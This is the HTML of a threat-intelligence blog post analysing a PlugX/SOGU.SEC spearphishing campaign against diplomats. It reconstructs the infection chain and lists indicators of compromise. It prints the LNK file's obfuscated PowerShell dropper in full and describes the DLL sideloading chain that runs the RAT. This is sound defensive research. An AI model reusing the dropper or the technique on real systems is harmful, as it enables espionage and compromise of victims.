<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Chinese UNC6384 Malware Campaign Exploits Cambodia Thailand Crisis | Martin Kubečka</title><meta name=keywords content="Threat Intelligence,Malware Analysis,Phishing Campaign,UNC6384,SOGU.SEC,PlugX,Korplug,DLL Sideloading"><meta name=description content="Diplomatic entities targeted in spearphishing campaign by UNC6384 cyber espionage."><meta name=author content="Martin Kubečka"><link rel=canonical href=https://martinkubecka.sk/posts/2025-10-29-chinese_unc6384_malware_campaign_exploits_cambodia_thailand_crisis/><link crossorigin=anonymous href=/assets/css/stylesheet.ba00c1f715cc18cbf534f1dd7be1b22fc29e5384ca42c46b68ff6c99b2b92143.css integrity="sha256-ugDB9xXMGMv1NPHde+GyL8KeU4TKQsRraP9smbK5IUM=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://martinkubecka.sk/images/favicon/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://martinkubecka.sk/images/favicon/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://martinkubecka.sk/images/favicon/favicon-32x32.png><link rel=apple-touch-icon href=https://martinkubecka.sk/images/favicon/apple-touch-icon.png><link rel=mask-icon href=https://martinkubecka.sk/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Chinese UNC6384 Malware Campaign Exploits Cambodia Thailand Crisis"><meta property="og:description" content="Diplomatic entities targeted in spearphishing campaign by UNC6384 cyber espionage."><meta property="og:type" content="article"><meta property="og:url" content="https://martinkubecka.sk/posts/2025-10-29-chinese_unc6384_malware_campaign_exploits_cambodia_thailand_crisis/"><meta property="og:image" content="https://martinkubecka.sk/images/general/chinese_unc6384_malware_campaign_exploits_cambodia_thailand_crisis/icon.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-10-29T00:00:00+00:00"><meta property="article:modified_time" content="2025-10-29T00:00:00+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://martinkubecka.sk/images/general/chinese_unc6384_malware_campaign_exploits_cambodia_thailand_crisis/icon.png"><meta name=twitter:title content="Chinese UNC6384 Malware Campaign Exploits Cambodia Thailand Crisis"><meta name=twitter:description content="Diplomatic entities targeted in spearphishing campaign by UNC6384 cyber espionage."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://martinkubecka.sk/posts/"},{"@type":"ListItem","position":3,"name":"Chinese UNC6384 Malware Campaign Exploits Cambodia Thailand Crisis","item":"https://martinkubecka.sk/posts/2025-10-29-chinese_unc6384_malware_campaign_exploits_cambodia_thailand_crisis/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Chinese UNC6384 Malware Campaign Exploits Cambodia Thailand Crisis","name":"Chinese UNC6384 Malware Campaign Exploits Cambodia Thailand Crisis","description":"Diplomatic entities targeted in spearphishing campaign by UNC6384 cyber espionage.","keywords":["Threat Intelligence","Malware Analysis","Phishing Campaign","UNC6384","SOGU.SEC","PlugX","Korplug","DLL Sideloading"],"articleBody":" Executive Summary In early October 2025, a targeted cyber espionage campaign leveraged a compromised Royal Embassy of Cambodia email account to deliver a sophisticated SOGU.SEC (also known as PlugX or Korplug) remote access trojan (RAT) to diplomatic entities via a spearphishing email. The email message contained a URL presented as a document about the Cambodia Thailand border crisis, and the landing page impersonated a Microsoft sign‑in portal to prompt a download. A ZIP archive was downloaded, containing a crafted LNK file that launched PowerShell to extract an embedded TAR archive. The TAR unpacked a legitimately signed Canon binary alongside a malicious DLL, which performed staged decryption and execution of the RAT via DLL Sideloading technique. Static and dynamic artifacts, together with behavioral alignment to published reporting, linked this sample to a PRC-nexus threat actor UNC6384, supporting cyber espionage operations aligned with the strategic interests of the People’s Republic of China. The use of advanced techniques and layered social engineering demonstrates this threat actor’s advanced capabilities.\nTechnical Analysis The analysis was conducted on Monday, October 1st, 2025, and focused on reconstructing the complete infection chain, from the initial spearphishing email to the final payload execution.\nSpearphishing Email A spearphishing email was sent from a compromised account belonging to the Royal Embassy of Cambodia in Seoul on Tuesday, September 30th, 2025, targeting diplomatic entities.\nThe threat actor used legitimate official emails previously distributed by embassy personnel to other diplomatic entities, specifically those addressing the ongoing Cambodia Thailand border situation [01], as a template. The date in the message body was modified to align with the day the malicious email was sent.\nInstead of the usual attached document containing official correspondence about the border situation, the attacker embedded a URL in the message body. Based on its naming convention, the URL appeared to link to a legitimate document, however, it actually redirected recipients to a Microsoft Azure endpoint under the attacker’s control.\nThe original email message and the spearphishing samples are shown below.\nA comparative analysis of the spearphishing email header and a legitimate message sent from the same address earlier in September 2025 confirmed that both emails originated from the same account. This finding further validated that the attacker had successfully compromised an official government email address for use in the campaign.\nChain of Infection Stage 0 : Delivery When the URL embedded in the spearphishing message was visited, the landing page presented a counterfeit Cloudflare CAPTCHA challenge and visually impersonated Microsoft’s sign-in portal by displaying the domain login.microsoftonline.com within the page content.\nAfter the bogus CAPTCHA was completed, the site automatically initiated the download of malicious ZIP archive NV2230_Update of Situation on Cambodia-Thailand Border.zip.\nThe staged challenge and familiar branding were meant to lower suspicion and make the website look legitimate and the download authorized.\nStage 1 : Dropper / Initial Loader The downloaded archive, NV2230_Update of Situation on Cambodia-Thailand Border.zip, contained a single Windows shortcut (LNK) file named NV2230_Update of Situation on Cambodia-Thailand Border.lnk.\n$ unzip NV2230_Update\\ of\\ Situation\\ on\\ Cambodia-Thailand\\ Border.zip Archive: NV2230_Update of Situation on Cambodia-Thailand Border.zip warning: NV2230_Update of Situation on Cambodia-Thailand Border.zip appears to use backslashes as path separators inflating: NV2230_Update of Situation on Cambodia-Thailand Border/NV2230_Update of Situation on Cambodia-Thailand Border.lnk The shortcut file was examined using lnkinfo from the liblnk-utils toolkit [02].\n$ lnkinfo NV2230_Update\\ of\\ Situation\\ on\\ Cambodia-Thailand\\ Border.lnk lnkinfo 20181227 Windows Shortcut information: Contains a description string Contains a command line arguments string Contains an icon location string Contains an environment variables block Link information: Creation time\t: Not set (0) Modification time\t: Not set (0) Access time\t: Not set (0) File size\t: 1174780 bytes Icon index\t: 0 Show Window value\t: 0x0011ecfc Hot Key value\t: 60668 File attribute flags\t: 0x00000000 Description\t: pdf Command line arguments\t: -w 1 -c \" ;; ;$ifipuznhxni = (get-childitem -Pa $Env:USERPROFILE -Re -Inc *'NV2230_Update of Situation on Cambodia-Thailand Border'.zip).fullname; ;;$ykvzh=[System.IO.File]::ReadAllBytes($ifipuznhxni);$gujjdckc=854; ;$qiiobmfibdew=[char]87+'r'+[char]105+'te'+[char]65+'l'+[char]108+'b'+[char]121+'tes'; ;echo $gujjdckc; ; ;echo $gujjdckc;;[System.IO.File]::$qiiobmfibdew($Env:temp+'\\\\rphbqultm.ta', $ykvzh[$gujjdckc..($gujjdckc+2049024-1)]); ;;;echo $gujjdckc;;;;echo $gujjdckc;; TaR -xvf $Env:TEMP\\rphbqultm.ta -C $Env:Temp;;echo $gujjdckc;dir;; Start-Process $Env:temp\\CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T\\cnmpaui.exe;\" Icon location\t: .\\WindowssSystem326Shell32.pdf Environment variables location\t: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe The lnkinfo output indicated that the shortcut launches PowerShell (C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe) with custom arguments. After cleaning and formatting, the executed PowerShell command was reconstructed as follows.\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w 1 -c \" $ifipuznhxni = ( Get-ChildItem -Pa $Env:USERPROFILE -Re -Inc *'NV2230_Update of Situation on Cambodia-Thailand Border'.zip ).FullName; $ykvzh=[System.IO.File]::ReadAllBytes($ifipuznhxni); $gujjdckc=854; $qiiobmfibdew=[char]87+'r'+[char]105+'te'+[char]65+'l'+[char]108+'b'+[char]121+'tes'; echo $gujjdckc; echo $gujjdckc; [System.IO.File]::$qiiobmfibdew( $Env:temp + '\\rphbqultm.ta', $ykvzh[$gujjdckc..($gujjdckc + 2049024 - 1)] ); echo $gujjdckc; echo $gujjdckc; TaR -xvf $Env:TEMP\\rphbqultm.ta -C $Env:Temp; echo $gujjdckc; dir; Start-Process $Env:temp\\CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T\\cnmpaui.exe;\" In this context:\nThe -c argument represents -Command, specifying the command string to execute. The -w 1 argument configures the PowerShell window style to minimized, effectively hiding execution from the user. PowerShell Script Behavior\nSearch and Locate ZIP File The script searches the user’s profile directory for any ZIP file whose name contained NV2230_Update of Situation on Cambodia-Thailand Border. This approach ensured the LNK could locate the archive regardless of where the recipient had saved or extracted it. Read ZIP File into Memory It reads the contents of the located ZIP file into memory as a byte array. Extract Embedded Payload The variable $gujjdckc defines an offset value of 854 bytes, indicating where to begin extracting a hidden data segment within the ZIP file. A new string variable is then constructed dynamically using character codes, producing the method name WriteAllBytes. This obfuscation is intended to make static analysis more difficult. [char]87 + 'r' → \"Wr\" + [char]105 → \"Wri\" + 'te' → \"Write\" + [char]65 → \"WriteA\" + 'l' → \"WriteAl\" + [char]108 → \"WriteAll\" + 'b' → \"WriteAllb\" + [char]121 → \"WriteAllby\" + 'tes' → \"WriteAllbytes\" Write and Extract Payload The script writes a 2049024 byte section from the ZIP file, beginning at byte offset 854, into a temporary file named %TEMP%\\rphbqultm.ta. It then extracts this archive using the tar utility into the %TEMP% directory. Execution of Dropped Binary Finally, the script executes the file cnmpaui.exe from a directory named CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T within %TEMP%. Throughout the PowerShell command, multiple echo and dir commands are present. These commands appeared to serve a debugging purpose and do not alter the execution flow.\nStage 2 : Loader / Secondary Payload / RAT Deployment A short Python script was used to reproduce the extraction behavior observed in the PowerShell command embedded in the LNK file. The script reads the file NV2230_Update of Situation on Cambodia-Thailand Border.zip, extracts the byte range starting at offset 854 for 2049024 bytes and writes the result to rphbqultm.ta.\n#!/usr/bin/env python3 input_file = \"NV2230_Update of Situation on Cambodia-Thailand Border.zip\" offset = 854 length = 2049024 output_file = \"rphbqultm.ta\" with open(input_file, \"rb\") as f_in: f_in.seek(offset) data = f_in.read(length) with open(output_file, \"wb\") as f_out: f_out.write(data) The script successfully wrote the expected number of bytes and produced a file that was identified as a tar archive. The archive was then extracted to reveal a directory containing three files.\n$ python3 archive_extractor.py Wrote 2049024 bytes to 'rphbqultm.ta'. $ file rphbqultm.ta rphbqultm.ta: POSIX tar archive $ tar -xvf rphbqultm.ta CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/ CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmpaui.dll CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmpaui.exe CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmplog.dat File type identification reported the following.\n$ file CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/* CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmpaui.dll: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows, 4 sections CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmpaui.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 6 sections CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmplog.dat: data Signature verification was performed using osslsigncode [03]. Result indicated that cnmpaui.exe is authentically signed by Canon, however, the signing certificate had expired in 2018.\n$ osslsigncode verify CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmpaui.exe PE checksum : 000608B0 Signature Index: 0 (Primary Signature) Message digest algorithm : SHA1 Current message digest : 76E99ABD3FEF78E76BE262AFB943713261F3D650 Calculated message digest : 76E99ABD3FEF78E76BE262AFB943713261F3D650 Signer's certificate: ------------------ Signer #0: Subject: /C=JP/ST=Kanagawa/L=Kawasaki-shi/O=Canon Inc./OU=Inkjet System Development Center/CN=Canon Inc. Issuer : /C=US/O=VeriSign, Inc./OU=VeriSign Trust Network/OU=Terms of use at https:\\/\\/www.verisign.com\\/rpa (c)10/CN=VeriSign Class 3 Code Signing 2010 CA Serial : 20A947947E703391C3008B626606FA8F Certificate expiration date: notBefore : Mar 30 00:00:00 2015 GMT notAfter : Apr 18 23:59:59 2018 GMT . . . Signature Index: 1 Message digest algorithm : SHA256 Current message digest : D9E0CAD06D399BF9BFB39BF15631320A1BCEA4D7E32DE152252BD25B3A21E6A4 Calculated message digest : D9E0CAD06D399BF9BFB39BF15631320A1BCEA4D7E32DE152252BD25B3A21E6A4 Signer's certificate: ------------------ Signer #0: Subject: /C=JP/ST=Kanagawa/L=Kawasaki-shi/O=Canon Inc./OU=Inkjet System Development Center/CN=Canon Inc. Issuer : /C=US/O=Symantec Corporation/OU=Symantec Trust Network/CN=Symantec Class 3 SHA256 Code Signing CA Serial : 6B648EAF4604EE3CF3AA244B0286F161 Certificate expiration date: notBefore : Sep 7 00:00:00 2015 GMT notAfter : Apr 18 23:59:59 2018 GMT . . . Next, the file cnmpaui.dll was analyzed using Detect It Easy (DiE) [04]. The tool produced the following output.\nAt approximately 4 KB, the DLL was notably small, indicating it most likely functioned as a loader / decryptor.\nAs found out from the Powershell script that was embeded in the LNK file, Canon’s IJ Printer Assistant Tool (cnmpaui.exe) is launched, which uses DLL Sideloading technique to load the cnmpaui.dll, that decrypts cnmpaui.dat.\nDuring the execution flow, the victim was presented with a document titled 2025.09.30_NV2230_Update of Situation on Cambodia-Thailand Border(For 28-29 Sept 2025).pdf to make the download seem legitimate, distracting the victim while the malicious code was executed in the background.\nDetonating the analyzed sample in the sandbox allowed us to determine the C2 domain used:\ndorareco.net Complete analysis based on sandbox execution can be found on Recorded Future Triage [05].\nAttribution Leveraging the collected technical evidence together with OSINT, the analyzed sample was confidently identified as a variant associated with the SOGU.SEC (also known as PlugX or Korplug) malware documented in Google Cloud’s Threat Intelligence (Mandiant) report titled Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats, published August 25, 2025 [06]. According to the report, the UNC6384 threat actor, a cluster associated with Chinese state linked cyber espionage, conducted targeted operations against diplomatic and governmental organizations. The group employed DLL Sideloading technique, encrypted configuration data, and modular payloads to maintain persistence.\nThe observed delivery method, execution pattern (PowerShell, tar extraction, signed Canon executable, DLL Sideloading) and other technical evidence, strongly matched the UNC6384 activity cluster documented by mentioned Google Cloud’s Threat Intelligence (Mandiant) report. This alignment strengthened the operational attribution to UNC6384 and provided context for the targeting of diplomatic entities described in the public report.\nAdditional samples demonstrating similar behavior have been identified and analyzed in other independent research efforts, including:\nCyber Threat Intelligence Briefing: Mustang Panda Spear-Phishing Campaign Exploiting the Cambodia-Thailand Border Situation by Pisut Muangsamai [07] CN APT targets Serbian Government by StrikeReady Labs [08] For a more detailed technical analysis of the Korplug malware, readers may refer to the two part analysis by RevEng.AI:\nUnmasking KorPlug: A Technical Breakdown - Part 1 [09] Unmasking KorPlug: A Technical Breakdown - Part 2 [10] Indicators of Compromise (IoCs) URL (Malware Distribution)\nCategory Value Azure storage https://mydownload.z29.web.core.windows.net/NV2230_Update_of_Situation_on_Cambodia-Thailand_Border.zip Command and Control (C2)\nCategory Value C2 (domain) dorareco.net Malware Files / Artifacts\nFilename / Artifact MD5 SHA-1 SHA-256 NV2230_Update of Situation on Cambodia-Thailand Border.zip c33861eb02323660ecef2f261f92880d 83c3cda4bc929a84ccc16a25595a1e85ee433faf b15acbf8509ee90858a1d60eea3c50094b1e2b0b65c8596c65fc998e9b6a08a9 NV2230_Update of Situation on Cambodia-Thailand Border.lnk bb74ca3517e51030867ced3a8ceb149d 7c465b66ff8ef4132e74ab489f6731bd26a4b64d 8635dcc2001514febc6a07714b8cf6a3684b4c4c3b8fc0e08b2f6b92a045e3cc rphbqultm.ta 80639fb809c24ab2f12ea7c4da167862 572fc5774568e536f956a002e67ade23af19b034 f04340f93e2f5f7d6d5521572f17c5b80f39984ee6b4b8c0899380e95a825127 cnmpaui.dll a38de163ee19e78d8582efb9d7f286c1 1ca908b27701259472c16614c3a69f48752bf6cf e35d8815206a77028b7b43bfb047eb9ad8a151164f5c1a7b6d3294bd50b668f2 cnmpaui.exe 0538e73fc195c3b4441721d4c60d0b96 baa569318144905563b469a5a006ad54eb616a02 4ed76fa68ef9e1a7705a849d47b3d9dcdf969e332bd5bcb68138579c288a16d3 cnmplog.dat f4b1a1516c99a196cd4d6af18f611766 46a530dd71b20a2b3f30b411dbe86f48e3d07750 d70600f0e4367e6e3e07f7b965b654e5bfbcb0afbccfe0f6a9a8d9f69c7061a3 Appendices Appendix A : C2 Domain Name WHOIS Record Domain name: dorareco.net Registry Domain ID: 3023929170_DOMAIN_NET-VRSN Registrar WHOIS Server: whois.namecheap.com Registrar URL: http://www.namecheap.com Updated Date: 0001-01-01T00:00:00.00Z Creation Date: 2025-09-28T08:20:33.00Z Registrar Registration Expiration Date: 2026-09-28T08:20:33.00Z Registrar: NAMECHEAP INC Registrar IANA ID: 1068 Registrar Abuse Contact Email: abuse@namecheap.com Registrar Abuse Contact Phone: +1.9854014545 Reseller: NAMECHEAP INC Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited Registry Registrant ID: Registrant Name: Redacted for Privacy Registrant Organization: Privacy service provided by Withheld for Privacy ehf Registrant Street: Kalkofnsvegur 2 Registrant City: Reykjavik Registrant State/Province: Capital Region Registrant Postal Code: 101 Registrant Country: IS Registrant Phone: +354.4212434 Registrant Phone Ext: Registrant Fax: Registrant Fax Ext: Registrant Email: ceb7a36e45864be88d86367fbec8e38e.protect@withheldforprivacy.com Registry Admin ID: Admin Name: Redacted for Privacy Admin Organization: Privacy service provided by Withheld for Privacy ehf Admin Street: Kalkofnsvegur 2 Admin City: Reykjavik Admin State/Province: Capital Region Admin Postal Code: 101 Admin Country: IS Admin Phone: +354.4212434 Admin Phone Ext: Admin Fax: Admin Fax Ext: Admin Email: ceb7a36e45864be88d86367fbec8e38e.protect@withheldforprivacy.com Registry Tech ID: Tech Name: Redacted for Privacy Tech Organization: Privacy service provided by Withheld for Privacy ehf Tech Street: Kalkofnsvegur 2 Tech City: Reykjavik Tech State/Province: Capital Region Tech Postal Code: 101 Tech Country: IS Tech Phone: +354.4212434 Tech Phone Ext: Tech Fax: Tech Fax Ext: Tech Email: ceb7a36e45864be88d86367fbec8e38e.protect@withheldforprivacy.com Name Server: dns1.registrar-servers.com Name Server: dns2.registrar-servers.com References [01] 2025 Cambodia Thailand border crisis: https://en.wikipedia.org/wiki/2025_Cambodian%E2%80%93Thai_border_crisis [02] liblnk-utils : https://launchpad.net/ubuntu/noble/+package/liblnk-utils [03] osslsigncode : https://github.com/mtrojnar/osslsigncode [04] Detect It Easy (DiE) : https://github.com/horsicq/Detect-It-Easy [05] Recorded Future Triage (Sample Analysis) : https://tria.ge/251021-g4nhbsgr4v [06] Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats : https://cloud.google.com/blog/topics/threat-intelligence/prc-nexus-espionage-targets-diplomats [07] Cyber Threat Intelligence Briefing: Mustang Panda Spear-Phishing Campaign Exploiting the Cambodia-Thailand Border Situation : https://www.linkedin.com/pulse/cyber-threat-intelligence-briefing-mustang-panda-pisut-muangsamai-7mtfc/ [08] CN APT targets Serbian Government : https://strikeready.com/blog/cn-apt-targets-serbian-government/ [09] Unmasking KorPlug: A Technical Breakdown - Part 1 : https://blog.reveng.ai/unmasking-korplug-journey-into-a-chinese-cyberattack-part-1-2/ [10] Unmasking KorPlug: A Technical Breakdown - Part 2 : https://blog.reveng.ai/unmasking-korplug-a-technical-breakdown-part-2/ ","wordCount":"2115","inLanguage":"en","image":"https://martinkubecka.sk/images/general/chinese_unc6384_malware_campaign_exploits_cambodia_thailand_crisis/icon.png","datePublished":"2025-10-29T00:00:00Z","dateModified":"2025-10-29T00:00:00Z","author":{"@type":"Person","name":"Martin Kubečka"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://martinkubecka.sk/posts/2025-10-29-chinese_unc6384_malware_campaign_exploits_cambodia_thailand_crisis/"},"publisher":{"@type":"Organization","name":"Martin Kubečka","logo":{"@type":"ImageObject","url":"https://martinkubecka.sk/images/favicon/favicon.ico"}}}</script></head><body id=top><script>window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://martinkubecka.sk accesskey=h title="$ cd /home/ (Alt + H)">$ cd /home/</a><div class=logo-switches></div></div><button id=menu-trigger aria-haspopup=menu aria-label="Menu Button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button><ul class="menu hidden"><li><a href=https://martinkubecka.sk/posts/ title=Posts><span>Posts</span></a></li><li><a href=https://martinkubecka.sk/security-advisories/ title="Security Advisories"><span>Security Advisories</span></a></li><li><a href=https://martinkubecka.sk/library/ title=Library><span>Library</span></a></li><li><a href=https://martinkubecka.sk/about/ title=About><span>About</span></a></li><li><a href=https://martinkubecka.sk/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://openguards.martinkubecka.sk/ title=OpenGuards><span>OpenGuards</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://martinkubecka.sk>Home</a>&nbsp;»&nbsp;<a href=https://martinkubecka.sk/posts/>Posts</a></div><h1 class=post-title>Chinese UNC6384 Malware Campaign Exploits Cambodia Thailand Crisis</h1><div class=post-description>Diplomatic entities targeted in spearphishing campaign by UNC6384 cyber espionage.</div><div class=post-meta><span title='2025-10-29 00:00:00 +0000 +0000'>October 29, 2025</span>&nbsp;·&nbsp;10 min&nbsp;·&nbsp;2115 words&nbsp;·&nbsp;Martin Kubečka</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#executive-summary>Executive Summary</a></li><li><a href=#technical-analysis>Technical Analysis</a><ul><li><a href=#spearphishing-email>Spearphishing Email</a></li><li><a href=#chain-of-infection>Chain of Infection</a></li></ul></li><li><a href=#attribution>Attribution</a></li><li><a href=#indicators-of-compromise-iocs>Indicators of Compromise (IoCs)</a></li><li><a href=#appendices>Appendices</a><ul><li><a href=#appendix-a--c2-domain-name-whois-record>Appendix A : C2 Domain Name WHOIS Record</a></li></ul></li><li><a href=#references>References</a></li></ul></nav></div></details></div><div class=post-content><p><img loading=lazy src=/images/general/chinese_unc6384_malware_campaign_exploits_cambodia_thailand_crisis/icon.png alt></p><hr><h2 id=executive-summary>Executive Summary<a hidden class=anchor aria-hidden=true href=#executive-summary>#</a></h2><p>In early October 2025, a targeted cyber espionage campaign leveraged a compromised Royal Embassy of Cambodia email account to deliver a sophisticated <strong>SOGU.SEC</strong> (also known as <strong>PlugX</strong> or <strong>Korplug</strong>) remote access trojan (RAT) to diplomatic entities via a spearphishing email. The email message contained a URL presented as a document about the Cambodia Thailand border crisis, and the landing page impersonated a Microsoft sign‑in portal to prompt a download. A ZIP archive was downloaded, containing a crafted LNK file that launched PowerShell to extract an embedded TAR archive. The TAR unpacked a legitimately signed Canon binary alongside a malicious DLL, which performed staged decryption and execution of the RAT via DLL Sideloading technique. Static and dynamic artifacts, together with behavioral alignment to published reporting, linked this sample to a PRC-nexus threat actor <strong>UNC6384</strong>, supporting cyber espionage operations aligned with the strategic interests of the People&rsquo;s Republic of China. The use of advanced techniques and layered social engineering demonstrates this threat actor’s advanced capabilities.</p><hr><h2 id=technical-analysis>Technical Analysis<a hidden class=anchor aria-hidden=true href=#technical-analysis>#</a></h2><p>The analysis was conducted on Monday, October 1st, 2025, and focused on reconstructing the complete infection chain, from the initial spearphishing email to the final payload execution.</p><h3 id=spearphishing-email>Spearphishing Email<a hidden class=anchor aria-hidden=true href=#spearphishing-email>#</a></h3><p>A spearphishing email was sent from a compromised account belonging to the <strong>Royal Embassy of Cambodia</strong> in Seoul on Tuesday, September 30th, 2025, targeting diplomatic entities.</p><p>The threat actor used legitimate official emails previously distributed by embassy personnel to other diplomatic entities, specifically those addressing the ongoing Cambodia Thailand border situation <a href=#references>[01]</a>, as a template. The date in the message body was modified to align with the day the malicious email was sent.</p><p>Instead of the usual attached document containing official correspondence about the border situation, the attacker embedded a URL in the message body. Based on its naming convention, the URL appeared to link to a legitimate document, however, it actually redirected recipients to a Microsoft Azure endpoint under the attacker’s control.</p><p>The original email message and the spearphishing samples are shown below.</p><p><img loading=lazy src=/images/general/chinese_unc6384_malware_campaign_exploits_cambodia_thailand_crisis/1-Legitimate-vs-Malicious-Email-Sample.png alt></p><p>A comparative analysis of the spearphishing email header and a legitimate message sent from the same address earlier in September 2025 confirmed that both emails originated from the same account. This finding further validated that the attacker had successfully compromised an official government email address for use in the campaign.</p><h3 id=chain-of-infection>Chain of Infection<a hidden class=anchor aria-hidden=true href=#chain-of-infection>#</a></h3><h4 id=stage-0--delivery>Stage 0 : Delivery<a hidden class=anchor aria-hidden=true href=#stage-0--delivery>#</a></h4><p>When the URL embedded in the spearphishing message was visited, the landing page presented a counterfeit Cloudflare CAPTCHA challenge and visually impersonated Microsoft&rsquo;s sign-in portal by displaying the domain <code>login.microsoftonline.com</code> within the page content.</p><p><img loading=lazy src=/images/general/chinese_unc6384_malware_campaign_exploits_cambodia_thailand_crisis/2-Malicious-Website.png alt></p><p>After the bogus CAPTCHA was completed, the site automatically initiated the download of malicious ZIP archive <code>NV2230_Update of Situation on Cambodia-Thailand Border.zip</code>.</p><p><img loading=lazy src=/images/general/chinese_unc6384_malware_campaign_exploits_cambodia_thailand_crisis/3-Malicious-Website-File-Download.png alt></p><p>The staged challenge and familiar branding were meant to lower suspicion and make the website look legitimate and the download authorized.</p><h4 id=stage-1--dropper--initial-loader>Stage 1 : Dropper / Initial Loader<a hidden class=anchor aria-hidden=true href=#stage-1--dropper--initial-loader>#</a></h4><p>The downloaded archive, <code>NV2230_Update of Situation on Cambodia-Thailand Border.zip</code>, contained a single Windows shortcut (LNK) file named <code>NV2230_Update of Situation on Cambodia-Thailand Border.lnk</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ unzip NV2230_Update\ of\ Situation\ on\ Cambodia-Thailand\ Border.zip 
</span></span><span class=line><span class=cl>Archive:  NV2230_Update of Situation on Cambodia-Thailand Border.zip
</span></span><span class=line><span class=cl>warning:  NV2230_Update of Situation on Cambodia-Thailand Border.zip appears to use backslashes as path separators
</span></span><span class=line><span class=cl>  inflating: NV2230_Update of Situation on Cambodia-Thailand Border/NV2230_Update of Situation on Cambodia-Thailand Border.lnk  
</span></span></code></pre></div><p>The shortcut file was examined using <strong>lnkinfo</strong> from the <strong>liblnk-utils</strong> toolkit <a href=#references>[02]</a>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ lnkinfo NV2230_Update\ of\ Situation\ on\ Cambodia-Thailand\ Border.lnk 
</span></span><span class=line><span class=cl>lnkinfo 20181227
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Windows Shortcut information:
</span></span><span class=line><span class=cl>	Contains a description string
</span></span><span class=line><span class=cl>	Contains a command line arguments string
</span></span><span class=line><span class=cl>	Contains an icon location string
</span></span><span class=line><span class=cl>	Contains an environment variables block
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Link information:
</span></span><span class=line><span class=cl>	Creation time			: Not set (0)
</span></span><span class=line><span class=cl>	Modification time		: Not set (0)
</span></span><span class=line><span class=cl>	Access time			: Not set (0)
</span></span><span class=line><span class=cl>	File size			: 1174780 bytes
</span></span><span class=line><span class=cl>	Icon index			: 0
</span></span><span class=line><span class=cl>	Show Window value		: 0x0011ecfc
</span></span><span class=line><span class=cl>	Hot Key value			: 60668
</span></span><span class=line><span class=cl>	File attribute flags		: 0x00000000
</span></span><span class=line><span class=cl>	Description			: pdf
